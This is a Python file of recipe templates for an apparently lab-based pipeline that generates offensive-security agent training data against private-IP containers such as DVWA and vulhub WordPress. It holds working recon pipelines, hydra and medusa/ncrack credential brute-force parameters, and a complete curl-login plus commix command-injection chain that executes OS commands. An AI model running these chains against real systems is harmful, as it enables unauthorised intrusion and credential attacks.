#!/usr/bin/env python3
"""Recipe TEMPLATES for pipeline_chain_builder.py, separated from the
runner so the recipe list can grow into the hundreds without touching
execution logic. This is the "more optimal way" than hand-authoring one
concrete recipe at a time: each template is ONE validated (or
candidate-for-validation) skeleton plus a `variations` list of parameter
substitutions, expanded at runtime into many concrete recipes.

A template's `stage_1`/`stage_2`/`condition_check` fields may contain
`{placeholder}` tokens in any string value (recursively, including nested
dict/list values) -- `expand_templates()` substitutes them per-variation
using Python's str.format(). This produces STRUCTURED tool calls (real
run_hydra/run_gobuster/etc. params, not just run_command shell strings)
wherever the underlying tool has one -- directly addresses the tool-
imbalance gap (see README's Known Gaps), unlike the shell-pipe-only
recipes needed for tools with no structured multi-step story (masscan/
naabu piping into nuclei/searchsploit).

`verified` on a template is honesty bookkeeping, not a gate:
  - True: this exact chained command was run live and confirmed working
    this session (see README's massaging-gotchas notes).
  - "components_only": every individual step has been verified live
    (elsewhere, e.g. exports_transcript2_extracted.jsonl's real WordPress
    hydra run), but this EXACT chained sequence hasn't been re-run as one
    harness invocation yet.
  - False: a candidate combination, plausible from documented tool
    syntax, not yet run against a real target at all. This is
    deliberately included, not withheld -- pipeline_chain_builder.py now
    tracks and records real failures (wrong syntax, tool not installed,
    unexpected output shape) as legitimate negative training signal
    rather than silently discarding them, so an unverified template
    "failing informatively" when actually run is itself useful, not a
    wasted attempt. This is the mechanism that makes farming this out
    across multiple machines/sessions productive without every template
    needing hand-verification first.

Run `python3 pipeline_chain_builder.py --list` to see the full expanded
candidate count before running anything.
"""

# --- Single-stage (stage-1/identification only) templates ------------------
# These never touch stage 2 and never need CONFIG.ALLOW_FULL_PIPELINE_CHAINS.
SINGLE_STAGE_TEMPLATES = [
    {
        "template_id": "naabu_nuclei_pipe",
        "verified": True,
        "stage_1": [
            {
                "tool": "run_command",
                "command": (
                    "naabu -host {target} -silent | tee /tmp/naabu_out.txt "
                    "| nuclei -silent -severity {severity} -t {template_path}"
                ),
            },
        ],
        "variations": [
            {"target": "172.17.0.12", "severity": "critical,high,medium", "template_path": "http/"},
            {"target": "172.17.0.12", "severity": "critical,high", "template_path": "http/exposures/"},
            {"target": "172.17.0.12", "severity": "critical,high,medium,low", "template_path": "http/misconfiguration/"},
            # v3: was 172.25.0.3 (the old compose stack's generic
            # infosecwarrior/web:v2 server) -- retargeted to wp2shell
            # (wordpress/CVE-2026-63030), same known-CVE model as every
            # other WordPress-targeting recipe now. Needs a fresh
            # `vulhub_lab.py up wordpress/CVE-2026-63030 --for-pathway
            # naabu_nuclei_pipe__v3` before this default IP is trusted.
            {"target": "172.27.0.3", "severity": "critical,high,medium", "template_path": "http/"},
            # v4/v5 (were 172.25.0.4 SNMP, 172.25.0.6 SMTP) REMOVED
            # outright, not retargeted -- SNMP/SMTP are out of scope
            # entirely now (this project's current focus is web recon/
            # OSINT/remote-vuln, see CLAUDE.md's cold-start note), and
            # piping a non-HTTP service's ports into nuclei's `http/`
            # templates was never a great fit for those targets anyway
            # even when they were in scope.
            # v4 (was v6): wp2shell again, a different nuclei template
            # category (exposures/) than v3 for real variety on the
            # same live target.
            {"target": "172.27.0.3", "severity": "critical,high,medium,low", "template_path": "http/exposures/"},
        ],
    },
    {
        "template_id": "naabu_nuclei_pipe_dast",
        # -dast is real (confirmed running cleanly this session per
        # exports/master.md) but a genuinely different template category
        # (dast/) -- a distinct variation axis, not a flag tweak on the
        # above.
        "verified": False,
        "stage_1": [
            {
                "tool": "run_command",
                "command": (
                    "naabu -host {target} -silent | tee /tmp/naabu_out.txt "
                    "| nuclei -silent -dast -t dast/{dast_category}/"
                ),
            },
        ],
        "variations": [
            {"target": "172.17.0.12", "dast_category": "http"},
            # v1: retargeted to wp2shell (wordpress/CVE-2026-63030), same
            # reasoning as naabu_nuclei_pipe's own retarget above.
            {"target": "172.27.0.3", "dast_category": "http"},
        ],
    },
    {
        # Retargeted from the old always-on offensive-pentesting-lab
        # docker-compose.yml's subnet ranges (172.25.0.2-.7,
        # 172.26.0.2-.4, 172.23.0.0/24) -- that stack has been retired
        # entirely in favor of vulhub_lab.py's on-demand, known-CVE model
        # (see training-data/README.md). A blind subnet sweep was exactly
        # the "shooting in the dark" pattern this pivot moved away from
        # anyway -- each variation below now targets ONE specific,
        # already-documented vulhub CVE environment instead, still
        # exercising the same masscan -> nmap -> searchsploit massaging
        # chain, just against a known single host/port rather than a
        # range of unknowns. `target` here is a REAL but EPHEMERAL IP --
        # vulhub containers get a fresh dynamic IP every time they're
        # brought up (unlike the old compose stack's fixed addresses),
        # so this baked-in default is only ever a placeholder for
        # whichever IP was live when last verified; the actual live IP
        # at farm-time comes from pipeline_targets.json, written by
        # `vulhub_lab.py up <app>/<CVE> --for-pathway
        # masscan_nmap_searchsploit_chain__vN`. Run that first, every
        # time -- don't trust this default across a restart.
        "template_id": "masscan_nmap_searchsploit_chain",
        "verified": True,
        "stage_1": [
            {
                "tool": "run_command",
                "command": (
                    "masscan -p{ports} {target} --rate {rate} --wait 0 "
                    "-oG /tmp/masscan_out.txt >/dev/null 2>&1 && "
                    "grep '^Timestamp' /tmp/masscan_out.txt | "
                    "awk -F'\\t' '{{host=$2; sub(/^Host: /,\"\",host); sub(/ \\(\\)$/,\"\",host); "
                    "port=$3; sub(/^Ports: /,\"\",port); split(port,pp,\"/\"); print host\":\"pp[1]}}' "
                    "| tee /tmp/massaged_targets.txt >/dev/null && "
                    "while IFS=: read -r host port; do "
                    "nmap -sV -p\"$port\" --open -oG - \"$host\" 2>/dev/null | grep 'Ports:'; "
                    "done < /tmp/massaged_targets.txt | "
                    "awk -F'\\t' '{{n=split($2,f,\"/\"); if (f[7] != \"\") print f[7]}}' | "
                    "sed -E 's/ \\(.*\\)//; s/ (httpd|smtpd|pop3d|imapd)( |$)/ /' | "
                    "sort -u | tee /tmp/versions_normalized.txt >/dev/null && "
                    "while read -r v; do echo \"--- $v ---\"; searchsploit \"$v\" 2>&1; done "
                    "< /tmp/versions_normalized.txt"
                ),
            },
        ],
        "variations": [
            # v0: tomcat/CVE-2017-12615 (PUT-method RCE). LIVE-VERIFIED
            # end to end through this exact chain: real "Apache Tomcat
            # 8.5.19" banner extracted, and searchsploit correctly
            # returned 2 real matching entries (42966.py, 42953.txt --
            # both genuinely cover "< 9.0.1 (Beta) / < 8.5.23", which
            # 8.5.19 falls within).
            {"target": "172.27.0.2", "ports": "8080", "rate": "200"},
            # v1: php/CVE-2019-11043 (PHP-FPM RCE via nginx). LIVE-
            # VERIFIED -- target the nginx front-end container
            # specifically (not php-fpm's own IP), matching the "which
            # container" choice --for-pathway/--container needs when
            # bringing this environment up. Real banner extracted
            # ("nginx 1.31.6"), searchsploit correctly returned NO
            # results -- an honest negative, not a bug: the actual CVE
            # lives in PHP-FPM's own request parsing, invisible to a
            # version-banner grab against nginx itself (nmap never talks
            # to php-fpm directly over the network at all).
            {"target": "172.27.0.3", "ports": "80", "rate": "200"},
            # v2: struts2/s2-045 (the Equifax CVE, CVE-2017-5638). LIVE-
            # VERIFIED -- real banner extracted was "Jetty 9.2.11.v20150529"
            # (this vulhub image bundles Struts2 on an embedded Jetty
            # servlet container, NOT Tomcat -- corrected from an earlier,
            # wrong assumption in this same comment before actually
            # running it), searchsploit correctly returned NO results --
            # same honest-negative reasoning as v1: the exploitable bug is
            # in Struts2's Jakarta Multipart parser, not in Jetty's own
            # version, so a bare banner lookup against Jetty was never
            # going to surface it.
            {"target": "172.27.0.2", "ports": "8080", "rate": "200"},
        ],
    },
    {
        # httpx-toolkit -> nuclei confirmed live this session (URL
        # normalization on a bare host:port works fine into nuclei's
        # input format) -- a genuinely different discovery-stage tool
        # than naabu, same downstream pipe shape.
        "template_id": "httpx_nuclei_pipe",
        "verified": "components_only",
        "stage_1": [
            {
                "tool": "run_command",
                "command": (
                    "echo '{target}:{port}' | httpx-toolkit -silent | tee /tmp/httpx_out.txt "
                    "| nuclei -silent -severity {severity} -t {template_path}"
                ),
            },
        ],
        "variations": [
            {"target": "172.17.0.12", "port": "80", "severity": "critical,high,medium", "template_path": "http/"},
            # v1: retargeted to wp2shell (wordpress/CVE-2026-63030).
            {"target": "172.27.0.3", "port": "80", "severity": "critical,high,medium", "template_path": "http/"},
            # v2 (was 172.25.0.4, an SNMP-lab container's unrelated
            # bonus web port) REMOVED outright, not retargeted -- SNMP
            # is out of scope entirely now (see naabu_nuclei_pipe's own
            # note above, same reasoning).
        ],
    },
    {
        # A different massaging chain than masscan's: nmap's own NSE vuln
        # scripts already surface CVE-looking strings in free text, not a
        # clean field -- massaging is a grep for the CVE-nnnn-nnnn shape,
        # deduped, piped to searchsploit. Live-verified against DVWA
        # (172.17.0.12) this pass: ran clean end to end via the real
        # harness (ToolExecutor -> tools.py -> remote_exec.py); whether it
        # actually surfaces a CVE depends on the target, same as any real
        # recon -- the syntax/pipe itself is confirmed sound.
        "template_id": "nmap_vuln_script_searchsploit",
        "verified": True,
        "stage_1": [
            {
                "tool": "run_command",
                "command": (
                    "nmap -sV --script vuln,http-enum -p{port} {target} 2>/dev/null "
                    "| tee /tmp/nmap_vuln_out.txt | grep -oE 'CVE-[0-9]{{4}}-[0-9]+' "
                    "| sort -u | tee /tmp/cves_found.txt | "
                    "while read -r cve; do echo \"--- $cve ---\"; searchsploit --cve \"$cve\" 2>&1; done"
                ),
            },
        ],
        "variations": [
            {"target": "172.17.0.12", "port": "80"},
            # v1/v2: both retargeted to wp2shell (wordpress/CVE-2026-63030)
            # -- v2 was the old compose stack's generic infosecwarrior/
            # web:v2 server (172.25.0.3), same retarget reasoning as the
            # other now-generic-web-pointed variations above.
            {"target": "172.27.0.3", "port": "80"},
            {"target": "172.27.0.3", "port": "80"},
        ],
    },
    {
        # User-supplied recipe, syntax CORRECTED before shipping (checked
        # statically against real nmap -oG output). Original used `grep Up |
        # awk '{print $2}'`, which only extracts the IP by coincidence
        # when the host has no reverse-DNS name -- confirmed via a real
        # `nmap -oG -` run: a resolvable host produces
        # "Host: 1.2.3.4 (some.host)\tStatus: Up", where $2 is the
        # hostname in parens, not the IP. Also confirmed `--open` fully
        # suppresses the Status:Up line when a host has zero open ports
        # in range, so grepping "Up" alone doesn't guarantee a matching
        # Ports: line follows for that host either. Fixed to grep the
        # Ports: line directly (same reliable filter the sibling
        # masscan_nmap_searchsploit_chain template already uses) and pull
        # the IP out of the Host: field with sub(), which is
        # hostname-agnostic.
        #
        # Originally targeted juice-shop (172.17.0.13:3000) -- REMOVED
        # per explicit decision: juice-shop's own documentation warns it
        # can't absorb sustained automated-attack load without falling
        # over (confirmed the hard way earlier this session: real OOM
        # crashes even after doubling its heap), and a full
        # fuzz-Bo0oM.txt wordlist run with -recursion is exactly that
        # kind of load. LIVE-VERIFIED against the WordPress lab
        # container (172.26.0.3) instead, unmodified syntax otherwise --
        # ran clean, real 403s on .htaccess-family paths, no further
        # fixes needed for this one.
        "template_id": "nmap_open_grep_xargs_ffuf",
        "verified": True,
        "stage_1": [
            {
                "tool": "run_command",
                "command": (
                    "nmap -p{port} --open -oG - {target} | grep 'Ports:' "
                    "| awk -F'\\t' '{{host=$1; sub(/^Host: /,\"\",host); "
                    "sub(/ \\(.*\\)$/,\"\",host); print host}}' "
                    "| xargs -I {{}} ffuf -u http://{{}}:{port}/FUZZ "
                    "-w {wordlist} -recursion"
                ),
            },
        ],
        "variations": [
            {
                "target": "172.26.0.3", "port": "80",
                "wordlist": "/usr/share/seclists/Fuzzing/fuzz-Bo0oM.txt",
            },
        ],
    },
    {
        # User-supplied recipe. Originally targeted juice-shop
        # (172.17.0.13:3000) -- REMOVED per explicit decision: juice-
        # shop's own documentation warns it can't absorb sustained
        # automated-attack load without falling over (confirmed the hard
        # way earlier this session: real OOM crashes under gobuster/dirb
        # load even after doubling its heap), which is exactly the
        # scenario this recipe's -t {threads} concurrency creates -- not
        # a fit for this repo's purposes. Re-verified live against the
        # WordPress lab container (172.26.0.3) instead, which found TWO
        # further real bugs unrelated to the target swap: (1) the
        # wordlist was rockyou.txt -- a PASSWORD list, not a path/content
        # wordlist; gobuster dir's -w wants directory/file names, using a
        # password list was always semantically wrong regardless of
        # target, just not obviously so against juice-shop's own catchall
        # behavior. Fixed to a real content-discovery wordlist. (2) this
        # gobuster version's dir-mode output has NO leading slash on the
        # path column ("admin", not "/admin" -- confirmed via a raw,
        # unpiped run), so `{target}:{port}{{}}` silently glued the
        # missing slash right into the port number
        # ("172.26.0.3:80admin" -> curl's "Port number was not a decimal
        # number" error on every single result). Fixed by adding the
        # slash explicitly in the xargs step. WordPress has no catchall-
        # 200 behavior (confirmed via a real 404 on a nonexistent path),
        # so --exclude-length is no longer needed here at all.
        "template_id": "gobuster_dir_xargs_curl_head",
        "verified": True,
        "stage_1": [
            {
                "tool": "run_command",
                "command": (
                    "gobuster dir -u http://{target}:{port} -w {wordlist} -t {threads} "
                    "--no-error -q | awk '{{print $1}}' "
                    "| xargs -I {{}} curl -I http://{target}:{port}/{{}}"
                ),
            },
        ],
        "variations": [
            {
                "target": "172.26.0.3", "port": "80", "threads": "20",
                "wordlist": "/usr/share/seclists/Discovery/Web-Content/common.txt",
            },
        ],
    },
    {
        # User-supplied recipe, syntax CORRECTED TWICE before shipping --
        # first pass (whitespace columns 5-7 of the whole -oG line) was
        # wrong per the docstring below; SECOND bug found by actually
        # running the "fixed" version in the real kali-agent-box
        # container against 172.17.0.12: `grep -oE '.../tcp[^,\t]*'`
        # returned EMPTY. Root cause: GNU grep -E does not treat \t
        # inside a [^...] bracket expression as a tab escape (that's a
        # -P/PCRE-only extension) -- it reads \t as the two literal
        # characters backslash and t, so the class excludes any literal
        # "t" and the match truncates at the t in "http" ("open/tcp//h").
        # A tab was never actually needed in the exclusion set here --
        # grep 'Ports:' already isolated the one line where tabs matter
        # (separating Host:/Ports:/Ignored State:), and within a single
        # port's slash-delimited sub-record there is no tab to exclude,
        # only the comma that separates it from the NEXT port on a
        # multi-port line. Dropped \t from the class; re-ran live and
        # confirmed a real Apache version string comes back correctly.
        #
        # Originally targeted juice-shop (172.17.0.13:3000) -- REMOVED
        # per explicit decision (see nmap_open_grep_xargs_ffuf's own note
        # above -- same reasoning). Re-verified live against DVWA
        # (172.17.0.12:80, Apache 2.4.25) instead: the pipe correctly
        # extracts the version string and hands it to searchsploit,
        # which comes back with a real, honest "No Results" (this
        # specific Apache build has no local exploit-db entries) -- a
        # clean, successful lookup with nothing found is still a correct
        # execution, not a failure.
        "template_id": "nmap_sV_grep_field_searchsploit",
        "verified": True,
        "stage_1": [
            {
                "tool": "run_command",
                "command": (
                    "nmap -sV -p{port} --open -oG - {target} 2>/dev/null | grep 'Ports:' "
                    "| grep -oE '{port}/open/tcp[^,]*' | awk -F'/' '{{print $6, $7}}' "
                    "| sed '/^[[:space:]]*$/d' "
                    "| xargs -I {{}} searchsploit {{}}"
                ),
            },
        ],
        "variations": [
            {"target": "172.17.0.12", "port": "80"},
        ],
    },
    {
        # User-supplied recipe, syntax CORRECTED TWICE (same two bugs as
        # nmap_sV_grep_field_searchsploit above, found the same way --
        # first a reasoned-through fix for the whitespace-column issue,
        # THEN a real failure caught by actually running it live in the
        # kali-agent-box container against 172.17.0.12, which returned
        # nothing despite a genuinely open, versioned Apache on port 80).
        # Root cause #2: identical `[^,\t]` grep -E bracket-expression bug
        # -- \t is not a tab escape inside [^...] under -E (PCRE/-P only),
        # so it's read as literal "\" + "t" and truncates at the t in
        # "http". Also worth noting from this same live run: this
        # target's nmap -oG Host: field is "172.17.0.12 ()" -- EMPTY
        # parens, not omitted parens and not a resolved hostname -- a
        # third shape beyond the two (with-hostname, no-parens-at-all)
        # checked when nmap_open_grep_xargs_ffuf was fixed earlier. Its
        # sub(/ \(.*\)$/,"",host) pattern already handles this shape fine
        # (matches empty parens too), so no further fix needed there, but
        # worth keeping in mind for any FUTURE Host:-field parsing added
        # to this file. Dropped \t from the class here the same way;
        # re-ran live against 172.17.0.12 and got a real Apache version
        # string back correctly.
        "template_id": "nmap_sV_multiport_field_searchsploit",
        "verified": False,
        "stage_1": [
            {
                "tool": "run_command",
                "command": (
                    "nmap -sV -p{ports} --open -oG - {target} 2>/dev/null | grep 'Ports:' "
                    "| grep -oE '[0-9]+/open/tcp[^,]*' | awk -F'/' '{{print $6, $7}}' "
                    "| sed '/^[[:space:]]*$/d' "
                    "| xargs -I {{}} searchsploit {{}}"
                ),
            },
        ],
        "variations": [
            {"target": "172.17.0.12", "ports": "80,443,3306"},
        ],
    },
    {
        # STRUCTURED run_dirb call (not run_command) -- dirb is a genuine
        # second, independent directory-brute tool alongside run_gobuster/
        # run_ffuf, directly addressing the tool-imbalance gap (dirb had
        # zero examples anywhere in the corpus before this template).
        # LIVE-VERIFIED end to end against DVWA (172.17.0.12): a real run
        # scanned all 4612 words in seclists' dirb/common.txt and found 6
        # real hits, including a listable /config/ directory (the same
        # known real lead CLAUDE.md documents from earlier DVWA sessions)
        # -- dirb correctly recursed into found directories and correctly
        # skipped re-scanning ones already flagged listable, per its own
        # WARNING output. NOTE: dirb was tried first against juice-shop
        # (172.17.0.13:3000, since removed from the lab entirely -- see
        # its own removal note on the sibling xargs recipes above) and
        # reliably crashed that container (a real target-side Node heap/
        # stability issue under sustained brute-force request volume,
        # confirmed via `docker logs` showing "JavaScript heap out of
        # memory" -- unrelated to dirb's own correctness). DVWA is the
        # permanent choice for this template now, not a stopgap.
        "template_id": "dirb_recon",
        "verified": True,
        "stage_1": [
            {"tool": "run_dirb", "target": "http://{target}/", "wordlist": "{wordlist}"},
        ],
        "variations": [
            {"target": "172.17.0.12", "wordlist": "/usr/share/wordlists/dirb/common.txt"},
        ],
    },
    {
        # STRUCTURED run_katana call -- katana had ZERO examples anywhere
        # in the corpus before this template (one of the 4 tools README's
        # Known Gaps calls out by name). LIVE-VERIFIED against the
        # WordPress lab target (172.26.0.3, "wp2shell"): a real crawl
        # surfaced genuine recon leads a directory-brute tool wouldn't --
        # /xmlrpc.php?rsd (WordPress's XML-RPC endpoint, a known brute-
        # force-amplification/pingback-abuse vector) and /author/admin/
        # (username enumeration via the author archive URL pattern) --
        # both organically discovered by following real links/JS/JSON
        # references on the page, which is katana's actual differentiator
        # from a wordlist-based brute-forcer like run_dirb/run_gobuster.
        "template_id": "katana_crawl_wordpress",
        "verified": True,
        "stage_1": [
            {"tool": "run_katana", "target": "http://{target}", "depth": "{depth}"},
        ],
        "variations": [
            {"target": "172.26.0.3", "depth": "2"},
        ],
    },
    {
        # STRUCTURED run_ffuf call -- ffuf had zero examples anywhere in
        # the corpus before this template, despite being a genuinely
        # different tool from run_gobuster/run_dirb (fast, Go-based,
        # designed for parameter/path fuzzing beyond plain directory
        # brute-force). LIVE-VERIFIED against the WordPress lab target
        # (172.26.0.3) using seclists' own CMS/wordpress.fuzz.txt wordlist
        # (a WordPress-specific path list, not the generic common.txt
        # run_dirb/run_gobuster's templates use) -- real hits included
        # readme.html/license.txt, which leak the exact installed
        # WordPress version even on a target that otherwise doesn't
        # expose it, a genuinely different recon value than a plain
        # directory listing.
        "template_id": "ffuf_wordpress_fuzz",
        "verified": True,
        "stage_1": [
            {"tool": "run_ffuf", "url": "http://{target}", "wordlist": "{wordlist}", "param": "FUZZ"},
        ],
        "variations": [
            {
                "target": "172.26.0.3",
                "wordlist": "/usr/share/wordlists/seclists/Discovery/Web-Content/CMS/wordpress.fuzz.txt",
            },
        ],
    },
]

# --- Two-stage (stage-1 -> stage-2) templates -------------------------------
# Use STRUCTURED tool calls wherever tools.py has one (run_hydra/
# run_gobuster/run_sqlmap/...) rather than a run_command shell string --
# this is what actually closes the tool-imbalance gap. Every one of these
# needs CONFIG.ALLOW_FULL_PIPELINE_CHAINS=true (or a matching
# condition_check) to reach stage 2 when actually run.
TWO_STAGE_TEMPLATES = [
    {
        # Every sub-step here (gobuster finding login.php, curl
        # establishing a session, hydra's exact http-post-form field
        # order) was individually proven live earlier this session
        # (playbook_dvwa.jsonl / exports_transcript2) -- not yet re-run as
        # ONE harness invocation against a currently-up target.
        "template_id": "web_login_discovery_hydra_chain",
        "verified": "components_only",
        "stage_1": [
            {"tool": "run_gobuster", "target": "http://{target}", "mode": "dir"},
            {"tool": "run_curl", "url": "http://{target}/{login_path}", "method": "GET"},
        ],
        "stage_2": [
            {
                "tool": "run_hydra",
                "target": "{target}",
                "service": "http-post-form",
                "username": "{username}",
                "wordlist": "{wordlist}",
                "path": "/{login_path}",
                "body": "{form_body}",
                "failure_string": "{failure_string}",
            },
        ],
        "variations": [
            {
                "target": "172.26.0.3", "login_path": "wp-login.php", "username": "admin",
                "wordlist": "/usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt",
                "form_body": "log=^USER^&pwd=^PASS^&wp-submit=Log+In",
                "failure_string": "incorrect",
            },
            {
                "target": "172.17.0.12", "login_path": "login.php", "username": "admin",
                "wordlist": "/usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt",
                "form_body": "username=^USER^&password=^PASS^&Login=Login",
                "failure_string": "incorrect",
            },
        ],
    },
    {
        # A single-stage (not two-stage) recipe -- login+cookie-capture
        # and the actual commix exploitation are BOTH folded into one
        # run_command shell invocation (same $host/$port-capture trick
        # masscan_nmap_searchsploit_chain uses), specifically to avoid the
        # dynamic-cross-step-value gap the removed authenticated_sqli_
        # dump_chain hit (see the note below) -- there is no separate
        # structured run_commix step here needing a value only stage 1
        # discovers, because there IS no separate step; the whole thing
        # is one shell command where $COOKIE is a real bash variable, not
        # a template placeholder. DVWA's default admin/password
        # credentials are this lab image's well-known intentional
        # default, not a "discovered" secret.
        #
        # LIVE-VERIFIED end to end against DVWA (172.17.0.12), 3/3 clean
        # runs (including 2 launched CONCURRENTLY, to rule out any
        # session-collision worry) with this exact final command shape --
        # but getting here took a real, instructive debugging detour
        # worth keeping: an EARLIER version of this recipe's login step
        # used a separate anonymous GET (no cookie jar) for the CSRF
        # token, then a SEPARATE POST with no -b/no -c at all, relying on
        # DVWA/PHP happening to mint a fresh session on that POST whose
        # Set-Cookie response header could be grepped back out. That
        # "worked" 2 of the first 3 times it was tried, which looked
        # exactly like commix's own detection being non-deterministic --
        # it wasn't. Confirmed by direct inspection: DVWA's login only
        # succeeds (Location: index.php) when the SAME PHPSESSID from the
        # initial GET is carried into the login POST (via -b AND -c on
        # BOTH curl calls against one cookie-jar file) -- without that,
        # the CSRF token doesn't validate against the right server-side
        # session, login silently redirects back to login.php instead of
        # index.php, and commix spends its whole run testing the
        # (unauthenticated) login page's own content for injectability,
        # which of course never succeeds. The jar already holds the
        # correct PHPSESSID after -c, so the fixed version below reads it
        # straight from the jar file instead of re-parsing a Set-Cookie
        # response header. Real command execution confirmed each clean
        # run (`id` -> "uid=33(www-data) gid=33(www-data)
        # groups=33(www-data)"; `whoami` -> "www-data" x2 more). Also
        # required --ignore-stdin (commix silently ignores -u and treats
        # stdin as a bulk target list under any non-interactive invocation
        # otherwise) and --answers='shell=N,random=Y,use the URL=Y,
        # Insufficient=Y' (--batch does NOT suppress several interactive
        # follow-up prompts after a confirmed injection; --answers matches
        # by SUBSTRING against the live prompt text, so key names must be
        # unique to their own prompt -- an earlier attempt used
        # 'directory=N' as a key, which also substring-matched a
        # DIFFERENT free-text prompt ("Enter a writable directory...")
        # and forced the literal string "N" in as a bogus directory path;
        # fixed by choosing longer, verified-unique substrings and by
        # answering the free-text directory prompt not at all, letting it
        # fall through to its own sensible default) -- see run_commix's
        # own tools.py docstring for the full diagnosis; both fixes are
        # baked into _run_commix itself, so any run_commix call gets them
        # automatically, not just this recipe.
        "template_id": "dvwa_commix_exec_chain",
        "verified": True,
        "stage_1": [
            {
                "tool": "run_command",
                "command": (
                    "curl -s -c /tmp/dvwa_cj.txt {target}/login.php -o /tmp/dvwa_login.html && "
                    "TOKEN=$(grep -oE \"user_token' value='[a-f0-9]+\" /tmp/dvwa_login.html "
                    "| grep -oE '[a-f0-9]{{32}}') && "
                    "curl -s -b /tmp/dvwa_cj.txt -c /tmp/dvwa_cj.txt -X POST {target}/login.php "
                    "--data \"username={username}&password={password}&Login=Login&user_token=$TOKEN\" "
                    "-o /dev/null && "
                    "COOKIE=\"$(grep PHPSESSID /tmp/dvwa_cj.txt | awk '{{print $6\"=\"$7}}'); security=low\" && "
                    "commix -u {target}/vulnerabilities/exec/ --batch --ignore-stdin -p ip "
                    "--data='ip=127.0.0.1&Submit=Submit' --cookie=\"$COOKIE\" "
                    "--os-cmd={os_cmd} --answers='shell=N,random=Y,use the URL=Y,Insufficient=Y'"
                ),
            },
        ],
        "variations": [
            {
                "target": "http://172.17.0.12", "username": "admin", "password": "password",
                "os_cmd": "id",
            },
        ],
    },
    # NOTE: an "authenticated_sqli_dump_chain" template (gobuster -> login
    # -> sqlmap with the resulting session cookie) was drafted and
    # DELIBERATELY REMOVED here, not shipped -- it needs a real PHPSESSID
    # captured from stage 1's actual login response passed into stage 2's
    # run_sqlmap `cookie` param, and this template system has no mechanism
    # for passing a dynamically-captured value between two separate
    # STRUCTURED tool calls (unlike the run_command shell-string chains
    # above, where `$host`/`$port` capture works because it's all one
    # shell invocation). A static `variations` entry can't fake this --
    # it would silently produce a literal, useless cookie string rather
    # than erroring. This is a real, currently-unaddressed architectural
    # gap for any future two-stage template that needs a stage-1-captured
    # dynamic value (a session cookie, a CSRF token, a discovered
    # credential) fed into a structured stage-2 tool call -- see README's
    # Known Gaps. dvwa_commix_exec_chain above sidesteps the exact same
    # wall by staying single-stage/single-shell-invocation rather than
    # solving cross-step value passing generally -- run_sqlmap's cookie
    # need in a genuinely TWO-STAGE template (separate stage_1/stage_2
    # structured calls) is still unaddressed.
    {
        # STRUCTURED run_medusa call in stage_2 -- medusa had ZERO
        # examples anywhere in the corpus before this template (one of
        # the 4 tools README's Known Gaps calls out by name). Genuinely
        # exploit_conditional, not exploit_authorized: nmap's ftp-anon
        # NSE script gives a clean, deterministic real-output string
        # ("Anonymous FTP login allowed") to gate on -- stage 2 only
        # proceeds because stage 1's REAL scan confirmed anonymous access
        # is enabled on THIS target, not a blanket override. LIVE-
        # VERIFIED against the lab's FTP container (172.25.0.2,
        # vsftpd 3.0.3): nmap's ftp-anon script confirmed the condition
        # for real, and a real medusa run against user "anonymous"
        # correctly reported every password in the wordlist as
        # ACCOUNT FOUND -- worth being honest in the row's own semantics
        # that this isn't really "cracking" a password, it's confirming
        # an intentionally-open anonymous account accepts anything,
        # which is itself the actual finding a real engagement would
        # report (not "we brute-forced FTP").
        # RETIRED: 172.25.0.2 was part of the offensive-pentesting-lab
        # docker-compose.yml stack, which has been retired entirely in
        # favor of vulhub_lab.py's on-demand, known-CVE model (see
        # training-data/README.md). vulhub has NO equivalent -- it is a
        # per-CVE catalog (specific software vulnerabilities), not a
        # misconfiguration-lab catalog, and anonymous FTP access is a
        # config weakness, not a CVE; confirmed by searching the full
        # vulhub tree for any ftp/vsftpd/proftpd directory at all (none
        # exist). This recipe's logic and its real, live-verified
        # findings from earlier this session (see the comment below)
        # are still correct -- there's simply nowhere to run it against
        # right now. Un-retire by pointing `variations` at a real
        # anonymous-FTP-enabled host again (e.g. if brought back on a
        # separate personal-network lab) and removing `retired`.
        "template_id": "ftp_anon_medusa_chain",
        "retired": True,
        "verified": True,
        "condition_check": "Anonymous FTP login allowed",
        "stage_1": [
            {"tool": "run_nmap", "target": "{target}", "flags": "-p21 -sV --script ftp-anon"},
        ],
        "stage_2": [
            {
                "tool": "run_medusa", "target": "{target}", "service": "ftp",
                "username": "anonymous", "wordlist": "{wordlist}",
            },
        ],
        "variations": [
            {
                "target": "172.25.0.2",
                "wordlist": "/usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt",
            },
        ],
    },
    {
        # STRUCTURED run_ncrack call in stage_2 -- ncrack had ZERO
        # examples anywhere in the corpus before this template (the last
        # of the 4 tools README's Known Gaps calls out by name; with this
        # and ftp_anon_medusa_chain above, all 4 zero-coverage tools
        # (run_netstat/run_ncrack/run_medusa/run_katana) now have at
        # least one real recipe -- run_netstat's own genuinely fits
        # nowhere naturally as a REMOTE recon step since it reports the
        # scanning HOST's own listening sockets, not the target's, so it
        # remains a documented gap rather than forced into a misleading
        # recipe). Same exploit_conditional gating as the medusa sibling
        # -- same real nmap ftp-anon confirmation, different credential-
        # attack tool for genuine tool-diversity on the identical
        # confirmed-anonymous target, not just a copy-paste of the
        # medusa recipe. LIVE-VERIFIED against 172.25.0.2 through the
        # real run_ncrack dispatch (not just the bare ncrack CLI) --
        # confirmed real output: "Discovered credentials for ftp on
        # 172.25.0.2 21/tcp: 'anonymous' 'root'".
        # RETIRED: same reason as ftp_anon_medusa_chain's own note above
        # -- no vulhub equivalent for a misconfiguration-class finding
        # (vulhub is CVE-specific), and 172.25.0.2 no longer exists.
        "template_id": "ftp_anon_ncrack_chain",
        "retired": True,
        "verified": True,
        "condition_check": "Anonymous FTP login allowed",
        "stage_1": [
            {"tool": "run_nmap", "target": "{target}", "flags": "-p21 -sV --script ftp-anon"},
        ],
        "stage_2": [
            {
                "tool": "run_ncrack", "target": "{target}", "service": "ftp",
                "users": "anonymous", "wordlist": "{wordlist}",
            },
        ],
        "variations": [
            {
                "target": "172.25.0.2",
                "wordlist": "/usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt",
            },
        ],
    },
]


def _substitute(obj, variables):
    if isinstance(obj, str):
        return obj.format(**variables)
    if isinstance(obj, dict):
        return {k: _substitute(v, variables) for k, v in obj.items()}
    if isinstance(obj, list):
        return [_substitute(v, variables) for v in obj]
    return obj


def expand_templates(templates, target_overrides=None):
    """Cross-products each template's stage_1/stage_2/condition_check
    against its own `variations` list, returning concrete recipes in the
    shape pipeline_chain_builder.run_recipe() expects
